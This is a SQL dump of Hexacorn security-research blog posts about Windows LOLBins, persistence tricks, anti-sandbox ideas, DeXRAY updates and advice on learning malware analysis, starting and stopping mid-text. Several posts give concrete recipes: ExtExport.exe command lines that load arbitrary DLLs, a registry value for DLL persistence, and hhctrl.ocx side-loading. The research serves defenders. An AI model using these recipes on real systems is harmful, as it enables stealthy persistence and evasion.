system to recognize the value of the key, a reboot might be required because some processes may have started before the key was set.\nThe registry key can also be controlled via Group Policy at Computer Configuration > Administrative Templates > System > Filesystem > Enable NTFS long paths.\nThis is very interesting.\nIf there is no limitation, malware could abuse it relying on the fact limitations apply to all software that is not aware of this change.\nFor instance, if sandbox is copying files from the sandbox to external world, using a script/program that runs inside the sandbox, and does not use the extended-length path’s prefix \\\\?\\ when it accesses files it will fail to copy files out as it won’t ‘see’ them (they are too deep). Notably, the very same limitation applies to the old trick where the known device name is used as a file name and such file (e.g. c:\\con) can only be accessed via that extended-length path’s prefix.\nBut are all sandbox developers aware of this? (unless they use external access to the sandbox disk using e.g. their own NTFS parser)\nAnd as for reversers… if the tool they use to browse the system, open the file don’t use the extended-length path’s prefix they will find themselves unable to browse/open files inside these deeply nested folders.\nAnd if you are a forensic investigator, there is yet another Registry key to learn about:\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\nLongPathsEnabled\nSo, not entirely new (the c:\\con trick is at least 10 years old), but perhaps new to you.\nShare this :)', 'Anti-*, Forensic Analysis, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2018/05/06/turning-the-max_path-length-to-11/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'Permanent Link to wab.exe as a LOLBin', 'Hexacorn', 'May 1, 2018 ', 'WAB stands for Windows Address Book. It’s also a name of a tool typically located inside these two file paths:\n\nc:\\Program Files (x86)\\Windows Mail\\wab.exe\nc:\\Program Files\\Windows Mail\\wab.exe\n\nIn the past the program was used to manipulate .wab files, but  nowadays it is a legacy tool and is not used that much anymore.\nStill, we can use it to do one more thing for us…\nWhen launched, it tries to load a wab32.dll library. The actual location and the name of a DLL is determined by the following Registry key:\n\nHKLM\\Software\\Microsoft\\WAB\\DLLPath\n\nwhich typically points to:\n\n%CommonProgramFiles%\\System\\wab32.dll\n\nBy changing this path you can load any DLL of your choice.\nOnly if the DLLPath Registry path is not resolved the tool will try to load the wab32.dll from a current directory. So yet another opportunity for side-loading…\nShare this :)', 'Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'Permanent Link to Beyond good ol’ Run key, Part 78', 'Hexacorn', 'April 29, 2018 ', 'This is an idea I had for a very long time, and I partially described it in the past except this time the mechanism I am thinking of is slightly different; I hesitated to come back to it because unlike SysLink example I still have not found a good candidate to demonstrate it. I do have one or two examples that should potentially work except it’s a functionality that is probably discontinued (as far as I can tell); and even if it is not it’s still one that is used so rarely that it doesn’t really matter from a practical point of view; I will refer to these candidates below.\nIn any case I think it’s good to add 5 cents to the old idea itself as it shows yet another potential way of achieving stealthy persistence w/o modifying Registry and .exe files.\nThe concept is as I described previously and based on the fact some programmers are trying to squeeze in all the data into program resources. In the past many of these resources would reside directly inside the program’s .exe file, nowadays a lot of them are stored inside the .mui files. If you don’t know what .mui file are – they are Multilingual User Interface resource files.\nTo get quickly familiar with their importance try to copy c:\\windows\\notepad.exe to a different folder and launch it from there. You won’t see Notepad starting, because it requires these .mui program resources. And these are stored under the OS directory inside a dedicated language folder e.g. on American English Windows it’s c:\\windows\\system32\\en-US. In order to run Notepad from a different folder you need to copy not only notepad.exe to the new folder, but also its resources en-US\\notepad.exe.mui (and you have to preserve this language symbol-based directory structure).\nThe modification of the .mui file is handy from a localization perspective, but not only. Imagine a piece of code that reaches out to .mui resources, fetches a string and then passes it directly to ShellExecute function (or one of its variants). Something along these lines:\nIf you can modify the string inside the resources you will control what is being passed to ShellExecute API. As such, you may achieve a very stealthy persistence, or perhaps LOLBIN-like functionality.\nNow… the problem is finding such candidate program.\nThis is incredibly difficult, but not impossible. The above snippet of code comes from shwebsvc.dll. From a bit of a research and guesswork I did it seems to be executed when users of the Order Print function decide to print photos using the online services (these are provided by various retailers in their area). This blog post shows how it looks like in practice. As far as I can tell the string 2505 from my example is used when the user clicks ‘please read our privacy statement’ link:\n\n(Copyright notice: the screenshot copied from the https://www.askdavetaylor.com/how_to_use_online_photo_printing_service_windows/ post).\nSo, it is very similar to the SysLink example except here there is a direct handling of the click inside the DLL.The second candidate is inside the comsnap.dll that is a COM+ Explorer MMC Snapin. Again, its usefulness for this sort of trick is a subject for a debate.\nI doubt further research will discover lots more of such candidate files, not only inside the native OS libraries, but also in popular software, but who knows…\nShare this :)', 'Autostart (Persistence), Random ideas', 'http://www.hexacorn.com/blog/2018/04/29/beyond-good-ol-run-key-part-78/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'Permanent Link to I shot the sigverif.exe – the GUI-based LOLBin', 'Hexacorn', 'April 27, 2018 ', 'File Signature Verification has nothing to do with launching arbitrary applications, but it is just a similar case to odbcad32.exe – the GUI apps can sometimes be abused to produce undesired effects – ones that their authors most likely have not anticipated…\nTime for the recipe.\nSo we launch the sigverif.exe:\n\nThen we go to Advanced settings by clicking the Advanced button, and we choose … the log file. And while we are at it why shouldn’t we choose the c:\\windows\\system32\\calc.exe as a destination?\nWe then hit the View Log button, and voila. Calculator is on the screen:\n\nShare this :)', 'Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'Permanent Link to NTFS Sparse files – another possible quick anti- trick', 'Hexacorn', 'April 25, 2018 ', 'A number of tricks that cause trouble to sandboxes, as well as malware analysts leverage less known features of NTFS (note: less known to programmers and perhaps reversers than to forensic experts). NTFS is rich in features and malware successfully abused these in the past, and… still does nowadays e.g. storing the code and data inside the Alternate Data Streams, Extended Attributes, toying around with Unicode character set by using RTLO (Right To Left Override) or homographic attacks to hide or obfuscate file names.\nWhat about Sparse files?\nThe way it works is that one can create a normal file using e.g. CreateFile API then use the FSCTL_SET_SPARSE control code to make this file grow in a perceived size very quickly. The change is instant as the system allocates a chain of clusters for such file inside the $MFT and does so in a smart way without actually using physical clusters that it would normally fill in with data (zeroes). So large these files can become that copying them outside of lab/sandbox will cause a lot of trouble, and who knows, in some cases may even DoS the whole lab device or network.\nThere is also one more trick that can be done here (while it doesn’t require using sparse files per se it is certainly easier to deliver it with this specific feature being enabled): a slightly more complex malware could artificially generate a new payload – a large PE file (and creating it in a sparse mode would be the fastest way to do so).  It would then fill it in with a modified PE header/sections data and sections placed in the vast space of a new file yet in a way that the file can be still executed. There are some constraints against maximum size and available memory of course. Again, it will be impossible to copy such file outside the lab/sandbox w/o either compressing it or shrinking it somehow. It may also be harder to dump its memory and post-process/analyze it efficiently (note that if these artificially created PE sections are large enough malware could fill it in memory with a lot of random data so the memory dump would contain some ‘data’ – imagine how long would it take to generate strings from it).\nAnd last but not least – such trickery may affect forensic evidence processing – such files would be certainly harder to extract. I don’t know what techniques forensics software can use to ensure extraction of sparse files is done efficiently (and how forensic software deals with it today), but well… using sparse files for the output could be probably a good idea? Also, how to browse such files efficiently? Some special mode that removes zeroes from the output and shows ‘islands’ of data? Some food for thought.\nNo PoCs as it is just a random thought.\nShare this :)', 'Anti-*, Anti-Forensics, Malware Analysis, Random ideas, Sandboxing', 'http://www.hexacorn.com/blog/2018/04/25/ntfs-sparse-files-another-possible-quick-anti-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'Permanent Link to ExtExport – yet another LOLBin', 'Hexacorn', 'April 24, 2018 ', 'This is a quick & dirty recipe how to load a DLL of your choice using a built-in tool ExtExport.exe that can be found inside the Internet Explorer directory:\nMethod #1\n\nDrop a file named like one of these:\n\nmozcrt19.dll\nmozsqlite3.dll\nsqlite3.dll\ninside the c:\\test folder\n\n\nNow run:\n\n“C:\\Program Files\\Internet Explorer\\ExtExport.exe” c:\\test foo bar\n\n\n\nThis will load one (or all) of these DLLs.\nMethod #2\nThe tool has more arbitrary DLL loading possibilities that allow to specify the name of the library directly from a command line.\nThis method requires providing more arguments e.g.:\n\nExtExport.exe c:\\Test\\test.dll 2 3 4 FIREFOX {00000000-0000-0000-0000-000000000000}\n\nI have not explored what other arguments mean but you can swap them with whatever you want to evade static detection; what matters is that the first argument must be a DLL name we want to load and the last argument must be a valid GUID presented in a form shown in a syntax above (acceptable by the IID­From­String function).\nMethod #3\n\nIt’s actually a variant of the method 2 – we just need to swap ‘FIREFOX’ with ‘360SE’:\n\nExtExport.exe c:\\Test\\test.dll 2 3 4 360SE {00000000-0000-0000-0000-000000000000}\n\nShare this :)', 'Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/04/24/extexport-yet-another-lolbin/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'Permanent Link to DeXRAY 2.13 update', 'Hexacorn', 'April 24, 2018 ', '@MrAdz350 pinged me on Twitter about his research on Sentinel One Quarantine files and as a result I have added support for this file format today. The support is not perfect yet – there seem to be some metadata appended to the encrypted file which dexray doesn’t support yet (some more analysis is needed). Still, at least you can extract the original sample.\nThanks @MrAdz350 !\nThe latest version of DeXRAY can be downloaded here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSentinel One (MAL)\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN), including from SEP on Linux\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/04/24/dexray-2-13-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, 'Permanent Link to DeXRAY 2.12 update', 'Hexacorn', 'April 23, 2018 ', 'One more update courtesy of Brian (thx man!).\nBrian added the extraction of metadata for the Linux VBN files.\nThe latest version of DeXRAY can be downloaded here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN), including from SEP on Linux\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/04/23/dexray-2-12-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, 'Permanent Link to Monitoring clipboard – a quick antisandbox trick', 'Hexacorn', 'April 23, 2018 ', 'Many existing anti-sandbox tricks rely on using timers, detecting mouse movement, checking the presence of the security tools, detecting virtualization, etc. While the list of existing tricks is long I don’t recall seeing clipboard monitoring being mentioned in this context and was curious if anyone discussed that before. Quick google search didn’t bring any results so I thought I will at least describe a high-level idea (FWIW most of the stuff I found online refers to malware monitoring clipboard in order to steal data that is copied to it – this includes an in-depth post by Michael Ligh who discusses it in a context of Volatility framework.)\nBtw. if you know any malware that is already using this trick it would be great if you could let me know. Thanks!\nAs per Microsoft, there are three ways to check if the clipboard content has changed; all of them rely on using dedicated APIs + in some cases require processing of window messages:\n\nMonitoring GetClipboardSequenceNumber return value changes\nAddClipboardFormatListener + WM_CLIPBOARDUPDATE message\nSetClipboardViewer + WM_DRAWCLIPBOARD message\n\nThere are at least two ways to incorporate these functions in an anti-sandbox routine:\n\nOne can use GetClipboardSequenceNumber API in a way similar to rdstc / GetTickCount trick and stall the code execution until a decent number of clipboard changes occurred (under assumption that the real person is actually using the system and CTRL+C/CTRL+V will generate enough changes to trigger the payload)\nUsing AddClipboardFormatListener / SetClipboardViewer will require creation of a worker window that will need to respond to the respective clipboard change window messages and when they arrive, the program can increase the internal counter until the threshold is met; only then execute the payload\n\nBoth are very easy to implement, and I won’t be providing a PoC code as you can grab it from MSDN and/or popular coding forums.\nSo, if you write sandboxes you may consider monitoring use of these APIs and trigger appropriate playbook that will generate a sequence of clipboard changes to trigger the code execution.\nIt’s good to mention that all of these APIs have their Nt equivalents that are processed by the win32u.dll/win32kfull.sys:\n\nNtUserGetClipboardSequenceNumber\nNtUserAddClipboardFormatListener\nNtUserSetClipboardViewer\n\nSo may be worth monitoring them on this level too.\nShare this :)', 'Anti-*, Malware Analysis, Sandboxing', 'http://www.hexacorn.com/blog/2018/04/23/monitoring-clipboard-a-quick-antisandbox-trick/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'Permanent Link to Beyond good ol’ Run key, Part 77', 'Hexacorn', 'April 23, 2018 ', 'This is one more about hh.exe program that is used when you open the .chm files.\nThe hh.exe functionality is implemented by the hhctrl.ocx library. When hh.exe is started it tries to find the hhctrl.ocx library by checking the following Registry value:\nHKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\nThe library that the value points to is then loaded.\nIf the library doesn’t exist, or the loading didn’t succeed the hh.exe gives it another go and attempts to load the library using the hard-coded name hhctrl.ocx and relying on the LoadLibrary function (and as a result is a subject to side-loading attacks).\nAs such, there seem to be at least 2 opportunities here:\n\nDrop c:\\WINDOWS\\hhctrl.ocx and delete the HKCR\\CLSID\\{52A2AAAE… value so running hh.exe will sideload the c:\\WINDOWS\\hhctrl.ocx\nReplace the value of the HKCR\\CLSID\\{52A2AAAE… to point to your own lib and run hh.exe – this will load the lib of choice\n\nBoth can be used as a LOLBin / Persistence trick (or a combo).\nShare this :)', 'Anti-*, Autostart (Persistence), Living off the land, LOLBins', 'http://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'Permanent Link to Beyond good ol’ Run key, Part 76', 'Hexacorn', 'April 22, 2018 ', 'Here’s yet another trick you can use to achieve persistence; this time the DLL of your choice will be loaded anytime the old-school .chm file is opened. While the documentation in this format slowly disappears from new programs you can still find plenty of software that uses it.\nIn order to achieve the persistence this way one has to add the following Registry key:\n[HKEY_CURRENT_USER\\Software\\Microsoft\\HtmlHelp Author]\r\n\"location\"=\"c:\\\\test\\\\test.dll\"\nShare this :)', 'Anti-*, Autostart (Persistence)', 'http://www.hexacorn.com/blog/2018/04/22/beyond-good-ol-run-key-part-76/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'Permanent Link to DeXRAY 2.11 update', 'Hexacorn', 'April 22, 2018 ', 'Brian and I looked at the issue brought up by @shotgunner101 and managed to update the DeXRAY and fix the issue. The latest version of DeXRAY can be downloaded here.\nThx Brian & @shotgunner101!\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN), including from SEP on Linux\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/04/22/dexray-2-11-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'Permanent Link to Kernel hacking tool you might have never heard of – XueTR/PCHunter', 'Hexacorn', 'April 20, 2018 ', 'It is a good habit to keep your eyes open and monitor the updates to your favorite tools. I do it ‘religiously’ and comb the internet for the updates every once in a while. I know that some of these tools are never executed on my host machine, but they deliver an extremely unique and valuable interpretation of the system internals that I can act upon so I always want to have the latest, the best.\nYou definitely used Sysinternals tools, including the Process Explorer, and the Rootkit Revealer. You might have heard, or used GMER.  Same for the RKU. Same for the Kernel Detective.\nAt least three of these tools were amazingly popular in the first decade of this century as they allowed to poke around things that other tools could only dream of. They were really ahead of a curve as they allowed to access the system in a nearly forensically-sound manner, unhook kernel and user mode hooks, scan the whole memory for badness and overall, really help to deal with a lot of nasty code from those days… One couldn’t imagine a manual system repair of a system infected with a rootkit w/o one of these tools…\nNow it’s 2018, and Windows 10 is out there.\nWhat tools can we use?\nMost of the aforementioned tools are kaput.\nThere is some light though…\nEnter Process Hacker\n– a  much better tool than Process Explorer.\nI love Process Hacker and am really happy that it works on Win 10 pretty well.\nWhile the official build is 2.39 and is 2 years old, there is a ‘nightly’ build you can always try to play with:\n\nhttps://wj32.org/processhacker/nightly.php\n\nThe last build, as of this post writing, is 3.0.1424 and is from 18/April/2018.\nYay! Go and get it!\nNow… the one I want to talk about though is XueTR/PCHunter.\nI bet you never heard of it.\nI have recently discovered that the author released a new version (in March 2018). The current version is 1.53 and according to the blog post it was tested with Win10 (16299).\nMind you. This is after 5 years of a hiatus on his blog, so this is great news that the author picked up and updated the tool.\nNow… before we begin – please note that the free version of PcHunter works on 32- and 64- bit Windows 10, and can’t be used commercially. This is explained in the About tab:\n\nWith that out of the way, we can explore the main interface.\nWhen you execute the main 64-bit .exe (PCHunter64.exe) you will be presented with this UI:\nThe interface is (not a surprise) similar to GMER/RKU and to Kernel Detective.\nThere is a bunch of tabs we can browse through and which explore the Windows 10 internals in details:\n\nList of processes\nKernel Modules\nKernel ‘Stuff’\n\nNotify routines (e.g. these that notify the driver about a new process being created)\nFilter\nDPC Timer\nWorker thread\nHal\nWdf\nFile System\nSystem Debug\nObject Hijack\nDirect IO\nGDT\n\n\nRing0 Hooks (including IRP+inline)\n\nSSDT\nShadowSSDT\nFSD\nKeyboard\nI804prt\nMouse\nPartmgr\nDisk\nAtapi\nAcpi\nScsi\nKernel Hook\nObject Type\nIDT\n\n\nRing3 Hooks\n\nMessage Hooks\nProcess Hook\nKernelCallbackTable\n\n\nNetwork\n\nPort\nTcpip\nNsiproxy\nTdx\nNdis Handler\nIE Plugin\nIE Shell\nSPI\nHosts file\n\n\nRegistry (browser)\nFile (system browser)\nStartup Info\n\nStartup\nServices\nScheduled task\n\n\nOther\n\nFile Association\nIFEO (Image File Execution Options)\nIME/TIP\nFirewall Rule\nUser Name\nOther (additional tools)\n\n\nExamination (forensic-like report)\nSetting\nAbout\n\nI am not going to include more screenshots. Download. Test. Make up your mind.\nI think the tool is pretty cool and worth at least checking.\nShare this :)', 'Reversing, Tips & Tricks', 'http://www.hexacorn.com/blog/2018/04/20/kernel-hacking-tool-you-might-have-never-heard-of-xuetr-pchunter/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (27, 'Permanent Link to How to become the best Malware Analyst E-V-E-R', 'Hexacorn', 'April 14, 2018 ', 'Update\nBIG thank you to all the reversers who provided the feedback so far; I have reviewed and updated the content based on this feedback, and hope this will be now more useful to all new guys; reversing community has a long history of being awesome and it shows. AGAIN, BIG THANK YOU!\nbtw. the title of this post is a tongue-in-cheek \nOld Post\nThere are a couple of reasons for me to write this post:\n\nI have been doing software analysis for a long time – 20 years, at least\nFor many years I have been doing it wrong\nFor many years I had absolutely no clue I was doing it wrong\nIn last few days a number of things happened\n\nI see ‘malware analysts’ doing more and more Bat Deductions (this is from reading various posts from the security vendors, I won’t name them)\nI have spoken to people who lied to me about their reverse engineering skills and I am trying to understand why + what stops them from actually learning the skills\nI have publicly criticized GREM – not in a malicious way, but more as an observation that certifications != skills (apologies to Lenny Zeltzer who is doing lots of the GREM work and I might have sounded critical of his course; my point was merely that a few days of even most detailed course won’t replace hours of … well… messing up your analysis and often going nowhere)\nI was actually approached by a number of GREM-certified people to help them with some reverse engineering/explanation of what they do/see\nMalware analysis is fun, but only if you know what you are doing; I was lucky to learn from many smart people and at the times when internet was not so prevalent, so I was recently asking myself a question – what would be the steps I would take today, knowing what I know, to learn RCE skills in the most efficient way possible\n\n\n\nLet me start with an old boring anecdote. One of my first experiences as a reverse engineer was looking at the code of demoscene productions. That was an incredibly stupid idea to pick it up as a target, but I was young and well, stupid. And yes, I didn’t know better. What I remember was that I got obsessed with the demoscene tricks and I really wanted to understand how they are done – in this case, how a certain particular full-screen scrolling effect was created.\nI eventually learned how they pulled it off (that was a special mode of the VGA card – a variation of the mode X IIRC – that allowed to write 16 pixels with one stosd operation if you must know), but not from my reverse engineering efforts. These ended up after few days when I realized that for these couple of days I was staring at a highly packed code and data which I disassembled with a pirated disassembler I found online (FWIW it was not IDA). The code was very misleading to me, because the disassembler added a lot of ‘useful’ comments to it; these comments sent me down the rabbit hole pretty quickly e.g. they hinted that some of the code was using DMA channels, so I hypothesized that perhaps the quick data transfer I was observing on the screen was due to the DMA usage. Oh boy… So… Wrong. Wrong. Wrong. It was that special VGA mode, cleverly used. What I was looking at was a non-sense gibberish that looked like a code.\nI wasted a lot of time.\nI have repeated the very same mistake MANY times. But… there is no other way to learn reverse engineering, a core skill for malware analysts. You just need to look at a lot of listings and files/databases with the disassembled or decompiled code. Over years I was cracking software, adding immortality to games, shortcuts to pass from one level to another, analyzing malware and pretty much always finding something new to look at every day. Yes, no matter how good you are, how many hours you spent with Ida, OllyDbg, Xdbg, and windbg, you are going to come across new stuff all the time. That’s actually the most attractive part of being a reverse engineer. You break stuff apart, and this stuff can be a PE file, a word document, an exploit inside the Adobe Flash, a COM trickery, an API trickery, a new functionality abused for malicious purposes, a closed-source project that can be only found on ATMs, a stuxnet-like nested doll, a clever php backdoor injected inside a legitimate HTML page, a JavaScript snippet activated when the user presses the Submit button, an AutoCad program, a jailbreak for iphone, a powershell snippet, a VBS badness, a HTA deliverable, a good old Office macro, a tricky URL, a tricky protocol, a side-loading attack, a supply chain attack, an insider threat modifying the affiliate ID, and old game that you want to port to a new platform, a vaporware where you want to add some missing functionality or bypass some annoying bug or disable a message box … Basically, whatever that can be changed for good or bad, abused or misused, and sometimes just understood, for the sole purpose of ‘knowing it better’, and all of it on a software level falls into this ‘software/malware analysis’ category…. and discovering it, analyzing it, breaking it apart and understanding the motivation of the guys behind the code is a source for a great intellectual fun, and fulfillment, even if most of the time, we are half-guessing…\nSo… without a further ado… this is my list of rules…  if you want to become a good malware analyst, I’d suggest following some of them. Don’t be shy. Ask for help. Describe what you did. Where you got stuck. There is always someone who will be happy to help. And again, and most importantly, remember that most of the reversing work is never finished. Yup. We start, we abandon it pretty quickly. We come back to it. I have some projects I opened 10 years ago and I sometimes come back to when I am in a mood. In many cases only if you are paid proper money it is worth doing further analysis. And the latter is what drives what I like to call a ROI-driven malware analysis (or, in general terms, software analysis that has an actual end & deliverable that keeps your man hours low, client satisfied, and everyone aware that we are just scratching the surface, but in an educated way).\nSo… again, without a further ado:\nRule #0:\n\nWaste a lot of time\nThere is absolutely no way to take a shortcut in reverse engineering\nYes, I am sorry, but it’s like with everything else… 10000h rule  stands true. BUT. like with everything in life, you may try to beat this number down!\n\nRule #1:\n\nDon’t trust your tools; they will mislead you, they will betray you\n\nNote: on day to day basis you can trust tools most of the time, but only if you made an effort in the past to understand what is that they are showing you, so that you can spot, or at least suspect bugs when you see something unexpected, or wrong\n\n\nIn particular, don’t trust any automation (automatic comments, sandboxing, IOC extraction, assessment, etc.); use these ONLY after you learn manual analysis\nThe automation (emphasis ‘at the beginning of learning’) is for the lazy, you can only use it when you know the caveats\n\nTo clarify, if you know how sandbox works, if you are just after behavioral stuff (IOCs), then sandbox analysis is often the best way to go; the point I am making is that if you don’t understand the caveats of automatic analysis, you will not be able to fully trust the sandbox output (or from any other tool really); also, depending on the case, you may want to confirm the sandbox findings manually (ok, for the caveats: anti-* routines, various execution paths depending on time, command line arguments, detected OS, presence of the internet, C2 address still existing, presence of targeted software, etc. – yup, you may get more than 1 different reports from the sandbox for a given sample, depending on the circumstances)\n\n\n\nRule #2:\n\nData is code, code is data\nIf you don’t know what you are looking at, assume you are looking at data.\nAny attempts to disassemble it are pointless unless you know the context, or have a hint it is indeed a piece of code.\n\nRule #3:\n\nThere is no such thing as static analysis\nLet me explain…\nYou calculated hashes, you ‘extracted’ strings, carved embedded files, you googled it, you checked VirusTotal, reviewed the sandbox report and you think you have done well.\nMaybe you even used some PE Viewer/Editor….\nWell, you have done what any automated system can do.\nTry harder.\nWhat many people refer to as static analysis*** is primarily FILE Analysis, not PROGRAM analysis\nThis is a TREMENDOUS difference\nYou can craft a file to look like Notepad yet still deliver a malicious payload\nFiles lie, code doesn’t\nSeriously… whatever you see in strings, PE tools, it’s just a wrapper; always assume it’s a wrapper that will fool you; if you trust it, there are always chances you will be taken for a ride\n***Now, I need to explain one thing – a number of respected reversers pointed out that they do lots of static code analysis; I think this is the key here – they mention ‘code’, and the reason I am talking about non-existence of static analysis is that there is that TREMENDOUS difference between analyzing a file, and a code that this file stores; static code analysis (SCA) exists of course, and is actually a big industry (ever heard of Fortify?); so, anyone reading _code_ w/o executing it is doing SCA… as a reverser you will do lots of static code analysis\n\nRule #4:\n\nYou must look at the code and must think like the coder who wrote it. You are building the image in your head, code blocks take some shape, shapes create a pattern, they align or not, you grasp it, or you don’t. You are basically writing or rewriting this code in your head.\nWhen you look at the code, you emulate it, you guess, you connect to it (from the basic instructions to code blocks)\n\nAs you do analysis e.g. in IDA, please make it a rule to label everything you see in the code as you walk through it. It saves a lot of time to know you have visited a certain path, routine, etc. even if you don’t know what it does, make a guess and name it in appropriate way e.g. ‘unknown_possibly_reading_file_xyz’, or ‘nothing1’ – it’s always better than ‘sub_xyz’\nYou will be surprised how these labeled functions ‘add up’ to your understanding of the code e.g. naming memory functions both for allocation and memory disposal often ‘fill-in’ the listings of many functions that rely on these functions quite well\n\n\nYou may not like it, but if you are not a programmer, you can’t reverse engineer well.\nA programmer runs the program or idea in their head, many times, and this is not called static programming, oh no… it’s a daunting technical and algorithmic challenge. It’s an obsession. Reverse engineering is even more painful as you need to go into that programmer’s head and understand _why_ they did certain things the way they did + you have to deal with what compilers produce. And it’s a code stripped of lots of information. And sometimes purposefully obfuscated.  Most of the time this is a painful exercise. This is why when you ‘get it’, you get that awesome ‘I cracked the puzzle’ feeling. I-t  i-s  p-a-i-n-f-u-l, but there is a reward.\n\nRule #5:\n\nDo not use tools unless you used pen at least once.\nRead PE file specification (same applies to other file formats, but let’s start with PE)\nLook at a random PE file (calc.exe, or whatever), print out the first page of the hex dump, and use pen to highlight structures you _manually_ recognize based on the PE format documentation. Don’t be lazy. Do it. Then use tools to confirm. If you make mistake, analyze where you made that mistake. Step back, re-assess. Ask others.\nDon’t watch videos on reverse engineering unless you know the basics. Videos are for lazy. You need to get your hands dirty. Asap.\n\nBased on the feedback from Twitter – some people find value in watching videos; I discourage using 